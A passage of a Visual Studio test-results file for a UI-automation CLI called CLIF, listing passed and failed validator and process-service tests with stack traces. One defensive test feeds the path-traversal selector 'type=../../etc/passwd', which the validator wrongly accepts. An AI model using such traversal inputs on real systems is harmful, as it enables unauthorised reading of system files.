<?xml version="1.0" encoding="utf-8"?>
<TestRun id="78ca2d5f-e895-4d43-b2b7-4a1cc6b2158b" name="Chris@MC-HR-128 2025-11-01 16:15:12" runUser="MC-HR-128\Chris" xmlns="http://microsoft.com/schemas/VisualStudio/TeamTest/2010">
  <Times creation="2025-11-01T16:15:12.0168324-04:00" queuing="2025-11-01T16:15:12.0168329-04:00" start="2025-11-01T16:15:08.9879510-04:00" finish="2025-11-01T16:15:32.3471860-04:00" />
  <TestSettings name="default" id="95b0cdb0-6573-40c3-82b7-7190559ebe4c">
    <Deployment runDeploymentRoot="Chris_MC-HR-128_2025-11-01_16_15_12" />
  </TestSettings>
  <Results>
    <UnitTestResult executionId="b669b28d-3867-4db5-8fdc-c5d7eac2e399" testId="3973dc2e-8167-34f2-5675-5e49f3e33d6c" testName="CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithAttachCommand_WithValidPid_ShouldCallAutomationService" computerName="MC-HR-128" duration="00:00:00.0130684" startTime="2025-11-01T16:15:12.8386695-04:00" endTime="2025-11-01T16:15:12.8515969-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="b669b28d-3867-4db5-8fdc-c5d7eac2e399" />
    <UnitTestResult executionId="44a6928c-bac2-444e-a4c5-052717d64c8b" testId="a7f4ad1b-e4a1-5bbf-0eae-ae2b2e68f1ee" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.DetachAsync_WhenNotAttached_ShouldCompleteSuccessfully" computerName="MC-HR-128" duration="00:00:00.0021136" startTime="2025-11-01T16:15:17.1484465-04:00" endTime="2025-11-01T16:15:17.1505004-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="44a6928c-bac2-444e-a4c5-052717d64c8b" />
    <UnitTestResult executionId="cb2b1684-4a95-4b9f-ac68-6f944ac294a1" testId="19ea9af8-0905-be53-f691-4adaef6ce49f" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.ProcessService_AllMethods_ShouldNotThrow" computerName="MC-HR-128" duration="00:00:03.0906868" startTime="2025-11-01T16:15:26.4826932-04:00" endTime="2025-11-01T16:15:29.5736752-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="cb2b1684-4a95-4b9f-ac68-6f944ac294a1" />
    <UnitTestResult executionId="21987916-a4e0-4e89-94a9-1f0a3a164433" testId="e9fc761b-2f97-2740-ed55-68b4bbaf0f0c" testName="CLIF.Tests.Unit.Services.ScriptServiceTests.SaveScriptAsync_WithInvalidPath_ShouldThrowException" computerName="MC-HR-128" duration="00:00:00.0122832" startTime="2025-11-01T16:15:12.7355533-04:00" endTime="2025-11-01T16:15:12.7545238-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="21987916-a4e0-4e89-94a9-1f0a3a164433" />
    <UnitTestResult executionId="9cdcd081-9e3d-49ca-ab43-ed0f30d57cc0" testId="c0b28f20-ec74-0fd9-fcee-85cf78137f9f" testName="CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithInvalidSelectors_ShouldFail(selector: null)" computerName="MC-HR-128" duration="00:00:00.0002353" startTime="2025-11-01T16:15:12.8597641-04:00" endTime="2025-11-01T16:15:12.8598721-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="9cdcd081-9e3d-49ca-ab43-ed0f30d57cc0" />
    <UnitTestResult executionId="cabbb314-d462-4566-b411-85bc685b61fa" testId="fd72200e-2477-dbbd-8250-f6cb6b63cb9d" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByWindowTitleAsync_WithVariousTitles_ShouldHandleGracefully(windowTitle: &quot;Calculator&quot;)" computerName="MC-HR-128" duration="00:00:00.9859209" startTime="2025-11-01T16:15:19.4059090-04:00" endTime="2025-11-01T16:15:20.3923886-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="cabbb314-d462-4566-b411-85bc685b61fa" />
    <UnitTestResult executionId="a7f02a2b-03ae-4370-bf71-d87532b727e6" testId="f6f40a08-0562-2fc1-84c0-81dd40932945" testName="CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithValidSelectors_ShouldPass(selector: &quot;TestButton&quot;)" computerName="MC-HR-128" duration="00:00:00.0018120" startTime="2025-11-01T16:15:12.8546773-04:00" endTime="2025-11-01T16:15:12.8548140-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a7f02a2b-03ae-4370-bf71-d87532b727e6">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithValidSelectors_ShouldPass(String selector) in c:\Users\Chris\clif\CLIF.Tests\Integration\ValidationHarnessTests.cs:line 63&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeDirectByRefWithFewArgs(Object obj, Span`1 copyOfArgs, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="0a93f18e-029f-43e7-a870-c6bfcdd6ca47" testId="33a32d27-c5f7-ee73-6242-b3bb8a3f9ced" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByIdAsync_WithNonExistentId_ShouldReturnNull" computerName="MC-HR-128" duration="00:00:00.0039936" startTime="2025-11-01T16:15:30.5944203-04:00" endTime="2025-11-01T16:15:30.5986648-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="0a93f18e-029f-43e7-a870-c6bfcdd6ca47" />
    <UnitTestResult executionId="2df7a274-4f3c-4df4-a8ea-b622135b9532" testId="2d14442d-4929-faaa-1fa3-f843a4212c81" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByNameAsync_WithEmptyOrNullName_ShouldReturnNull(processName: &quot;   &quot;)" computerName="MC-HR-128" duration="00:00:02.7452314" startTime="2025-11-01T16:15:11.1764816-04:00" endTime="2025-11-01T16:15:13.8906280-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2df7a274-4f3c-4df4-a8ea-b622135b9532" />
    <UnitTestResult executionId="ebadb8bb-7311-4150-97a7-c32afdee5c2c" testId="79180851-c784-48b2-fa2b-5154a0f105a5" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.FindElementAsync_WithValidSelectors_ShouldAttemptToFind(selector: &quot;class=ButtonClass&quot;)" computerName="MC-HR-128" duration="00:00:00.0041396" startTime="2025-11-01T16:15:17.1002535-04:00" endTime="2025-11-01T16:15:17.1046345-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ebadb8bb-7311-4150-97a7-c32afdee5c2c" />
    <UnitTestResult executionId="116414b4-a761-4260-ba6d-94df6943e02a" testId="2234b49a-1926-5505-df72-b8b49da782fc" testName="CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: &quot;C:\\temp\\script.json&quot;)" computerName="MC-HR-128" duration="00:00:00.0013471" startTime="2025-11-01T16:15:12.8682054-04:00" endTime="2025-11-01T16:15:12.8683012-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="116414b4-a761-4260-ba6d-94df6943e02a">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(String path) in c:\Users\Chris\clif\CLIF.Tests\Integration\ValidationHarnessTests.cs:line 98&#xD;
   at InvokeStub_ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="46183d1f-965c-41b3-9fae-7fb5d7b5feb0" testId="a56269ad-3cbe-8785-f9fc-39c470a52451" testName="CLIF.Tests.Unit.Services.AutomationServiceTests.FindElementAsync_WithValidSelectors_ShouldAttemptToFind(selector: &quot;id=TestButton&quot;)" computerName="MC-HR-128" duration="00:00:00.0014314" startTime="2025-11-01T16:15:17.1074882-04:00" endTime="2025-11-01T16:15:17.1091058-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="46183d1f-965c-41b3-9fae-7fb5d7b5feb0" />
    <UnitTestResult executionId="785af6ad-de32-4d49-97fe-f79692a8993d" testId="473d9ff9-40a5-bf4f-70f2-c8269d438141" testName="CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithInvalidPaths_ShouldFail(path: null)" computerName="MC-HR-128" duration="00:00:00.0002363" startTime="2025-11-01T16:15:12.8707906-04:00" endTime="2025-11-01T16:15:12.8708893-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="785af6ad-de32-4d49-97fe-f79692a8993d" />
    <UnitTestResult executionId="e7dc5b6d-3f07-4cfb-ac39-8e1b8a69f21b" testId="4b4b58fc-fbce-92d1-63fe-395776f52ebd" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByWindowTitleAsync_WithEmptyTitle_ShouldHandleGracefully" computerName="MC-HR-128" duration="00:00:01.0000964" startTime="2025-11-01T16:15:29.5936262-04:00" endTime="2025-11-01T16:15:30.5942777-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="e7dc5b6d-3f07-4cfb-ac39-8e1b8a69f21b" />
    <UnitTestResult executionId="d905b975-f7f7-4870-88c9-c7cfa6f95d8e" testId="7fb8721c-fe8c-50e9-f06e-b999d602cbcd" testName="CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithInvalidPaths_ShouldFail(path: &quot;&quot;)" computerName="MC-HR-128" duration="00:00:00.0000150" startTime="2025-11-01T16:15:12.8710622-04:00" endTime="2025-11-01T16:15:12.8711585-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="d905b975-f7f7-4870-88c9-c7cfa6f95d8e" />
    <UnitTestResult executionId="1aba2550-37ed-40b7-be49-ce5f0f9e628d" testId="3b4ce8ad-95b1-e2d8-cc8c-83aaec9cdd3b" testName="CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithValidSelectors_ShouldReturnSuccess(selector: &quot;id=MyButton&quot;)" computerName="MC-HR-128" duration="00:00:00.0002497" startTime="2025-11-01T16:15:12.7209861-04:00" endTime="2025-11-01T16:15:12.7210916-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="1aba2550-37ed-40b7-be49-ce5f0f9e628d" />
    <UnitTestResult executionId="b9df54c7-0460-48fd-be28-2294865787c5" testId="93a080f6-9476-f133-7551-4a6a2df3ed75" testName="CLIF.Tests.Unit.Services.SessionCaptureServiceTests.CaptureAfterInteractionAsync_ShouldLogInteraction" computerName="MC-HR-128" duration="00:00:00.4733160" startTime="2025-11-01T16:15:13.5754435-04:00" endTime="2025-11-01T16:15:14.0576915-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="b9df54c7-0460-48fd-be28-2294865787c5" />
    <UnitTestResult executionId="ca563b21-7a46-435d-a630-3d7e746544db" testId="15939753-aee9-15dd-c43c-ff8b4755bbd1" testName="CLIF.Tests.Unit.Commands.InteractCommandTests.Constructor_ShouldCreateValidCommand" computerName="MC-HR-128" duration="00:00:00.0006322" startTime="2025-11-01T16:15:12.5282750-04:00" endTime="2025-11-01T16:15:12.5285017-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ca563b21-7a46-435d-a630-3d7e746544db" />
    <UnitTestResult executionId="5d98860f-7cb0-4de8-8a62-f00fe71a5ccb" testId="05c7fbdf-2a70-494d-3ed6-3d00ff1239c9" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByIdAsync_WithCurrentProcess_ShouldHandleGracefully" computerName="MC-HR-128" duration="00:00:00.0194157" startTime="2025-11-01T16:15:29.5741892-04:00" endTime="2025-11-01T16:15:29.5934914-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="5d98860f-7cb0-4de8-8a62-f00fe71a5ccb" />
    <UnitTestResult executionId="55465371-2028-4301-a51b-e41d6af92c37" testId="6b473fde-3fd7-759b-ba2d-5faee05be5df" testName="CLIF.Tests.Unit.Commands.ListProcessesCommandTests.Command_ShouldBePartOfCommandSystem" computerName="MC-HR-128" duration="00:00:00.0106230" startTime="2025-11-01T16:15:12.6422274-04:00" endTime="2025-11-01T16:15:12.6436880-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="55465371-2028-4301-a51b-e41d6af92c37" />
    <UnitTestResult executionId="5121d622-e9c9-4e55-96f9-70c6c88e29bd" testId="2dd1f5b9-91d7-83d5-77c8-41d057834559" testName="CLIF.Tests.Unit.Validation.ValidationResultTests.ValidationResult_ToString_ShouldProvideUsefulRepresentation" computerName="MC-HR-128" duration="00:00:00.0024272" startTime="2025-11-01T16:15:12.5698905-04:00" endTime="2025-11-01T16:15:12.5700469-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="5121d622-e9c9-4e55-96f9-70c6c88e29bd">
      <Output>
        <ErrorInfo>
          <Message>Expected failureString "CLIF.Validation.ValidationResult" to contain "Test error".</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.Contain(String expected, String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.ValidationResultTests.ValidationResult_ToString_ShouldProvideUsefulRepresentation() in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\ValidationResultTests.cs:line 105&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithNoArgs(Object obj, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="8ba3600f-1b9f-4df7-a894-300196023e10" testId="e3fef44b-5c60-087c-e6dd-8abcdd711841" testName="CLIF.Tests.Unit.Commands.ClickCommandTests.Command_ShouldHaveRequiredOptions" computerName="MC-HR-128" duration="00:00:00.0018209" startTime="2025-11-01T16:15:12.5042745-04:00" endTime="2025-11-01T16:15:12.5043841-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="8ba3600f-1b9f-4df7-a894-300196023e10" />
    <UnitTestResult executionId="d55eab5b-6626-4056-af78-2e65bd28448a" testId="318cbae8-6f5c-6107-83ea-b994589126ad" testName="CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithMaliciousSelectors_ShouldReturnFailure(maliciousSelector: &quot;type=../../etc/passwd&quot;)" computerName="MC-HR-128" duration="00:00:00.0034960" startTime="2025-11-01T16:15:12.6641571-04:00" endTime="2025-11-01T16:15:12.6644229-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="d55eab5b-6626-4056-af78-2e65bd28448a">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be False, but found True.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeFalse(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithMaliciousSelectors_ShouldReturnFailure(String maliciousSelector) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\ElementSelectorValidatorTests.cs:line 57&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeDirectByRefWithFewArgs(Object obj, Span`1 copyOfArgs, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="71bffb6a-7938-4001-bf27-8bf777c0254c" testId="6259a4a2-a25c-c6b3-c95f-cc66469bbf28" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.GetWpfProcessesAsync_ShouldReturnProcessList" computerName="MC-HR-128" duration="00:00:01.5163245" startTime="2025-11-01T16:15:30.5988853-04:00" endTime="2025-11-01T16:15:32.1196278-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="71bffb6a-7938-4001-bf27-8bf777c0254c" />
    <UnitTestResult executionId="fb7fd98f-838b-4bb9-9a0d-1c56c5605167" testId="5cef5222-5ed4-b002-5a9d-528cb3f35010" testName="CLIF.Tests.Unit.Services.ElementTreeServiceTests.BuildTreeAsync_WithNullElement_ShouldReturnEmptyNode" computerName="MC-HR-128" duration="00:00:00.0531741" startTime="2025-11-01T16:15:13.2457387-04:00" endTime="2025-11-01T16:15:13.3205511-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="fb7fd98f-838b-4bb9-9a0d-1c56c5605167" />
    <UnitTestResult executionId="32a81360-d66c-4d0a-8e93-de4f41e1d7f9" testId="afbc85d9-a6be-9da0-a791-21bbee7c7bba" testName="CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePaths_ShouldReturnSuccess(path: &quot;D:\\Projects\\automation\\script.json&quot;)" computerName="MC-HR-128" duration="00:00:00.0062446" startTime="2025-11-01T16:15:12.6523454-04:00" endTime="2025-11-01T16:15:12.6525107-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="32a81360-d66c-4d0a-8e93-de4f41e1d7f9">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithValidAbsolutePaths_ShouldReturnSuccess(String path) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\FilePathValidatorTests.cs:line 41&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeDirectByRefWithFewArgs(Object obj, Span`1 copyOfArgs, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="1154b010-8bc5-46fb-9cc8-127d4342df83" testId="2aebd923-14ac-caa7-e634-b7278ec1edb8" testName="CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithInvalidSelectorTypes_ShouldReturnFailure(selector: &quot;invalid=selector&quot;)" computerName="MC-HR-128" duration="00:00:00.0000227" startTime="2025-11-01T16:15:12.7228440-04:00" endTime="2025-11-01T16:15:12.7229432-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="1154b010-8bc5-46fb-9cc8-127d4342df83" />
    <UnitTestResult executionId="ab016b22-d4ad-4ea3-84d7-93c43a2cef45" testId="d62dd238-b178-bc83-b125-fd477bcf7845" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.GetWpfProcessesAsync_FilteringBehavior" computerName="MC-HR-128" duration="00:00:01.0127093" startTime="2025-11-01T16:15:18.3944509-04:00" endTime="2025-11-01T16:15:19.4057646-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ab016b22-d4ad-4ea3-84d7-93c43a2cef45" />
    <UnitTestResult executionId="b0c12dde-d18d-4530-a6db-feffc05de278" testId="c817e0f2-e337-d8ee-8622-8fc06220f0f4" testName="CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(longText: &quot;Lorem ipsum dolor sit amet, consectetur adipiscing&quot;···)" computerName="MC-HR-128" duration="00:00:00.0015580" startTime="2025-11-01T16:15:12.5780954-04:00" endTime="2025-11-01T16:15:12.5782820-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="b0c12dde-d18d-4530-a6db-feffc05de278">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be False, but found True.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeFalse(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(String longText) in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\TextInputValidatorTests.cs:line 104&#xD;
   at InvokeStub_TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="2d6b5dcd-8fec-4815-bcc6-bacbaa4805f3" testId="d1e64cb2-d0fe-f2c6-a2c1-798bc87a9acd" testName="CLIF.Tests.Unit.Validation.ValidationResultTests.Failure_WithMessage_ShouldCreateInvalidResult" computerName="MC-HR-128" duration="00:00:00.0002067" startTime="2025-11-01T16:15:12.5716795-04:00" endTime="2025-11-01T16:15:12.5733773-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2d6b5dcd-8fec-4815-bcc6-bacbaa4805f3" />
    <UnitTestResult executionId="141faea3-1a89-4770-bf6b-3f25e201d73b" testId="b33a95db-f772-b3ef-bf8d-d7830e324123" testName="CLIF.Tests.Unit.Services.ScriptServiceTests.LoadScriptAsync_WithValidScript_ShouldReturnScript" computerName="MC-HR-128" duration="00:00:00.0810656" startTime="2025-11-01T16:15:12.8811928-04:00" endTime="2025-11-01T16:15:12.9830166-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="141faea3-1a89-4770-bf6b-3f25e201d73b" />
    <UnitTestResult executionId="7862a17c-1558-4f5e-aed3-4d8ac7789766" testId="e6573aa4-35ca-c8d5-fc23-19b34350d154" testName="CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithInvalidPaths_ShouldFail(path: &quot;   &quot;)" computerName="MC-HR-128" duration="00:00:00.0004166" startTime="2025-11-01T16:15:12.8705080-04:00" endTime="2025-11-01T16:15:12.8706081-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="7862a17c-1558-4f5e-aed3-4d8ac7789766" />
    <UnitTestResult executionId="4e8392bb-e6eb-4781-8484-71d4f1911850" testId="ca0fce5c-e1da-45ba-ec25-a09d0a27ba5c" testName="CLIF.Tests.Unit.Validation.ElementSelectorValidatorTests.Validate_WithInvalidFormat_ShouldReturnFailure(selector: &quot;missing-equals-sign&quot;)" computerName="MC-HR-128" duration="00:00:00.0251355" startTime="2025-11-01T16:15:12.7159940-04:00" endTime="2025-11-01T16:15:12.7161100-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="4e8392bb-e6eb-4781-8484-71d4f1911850">
      <Output>
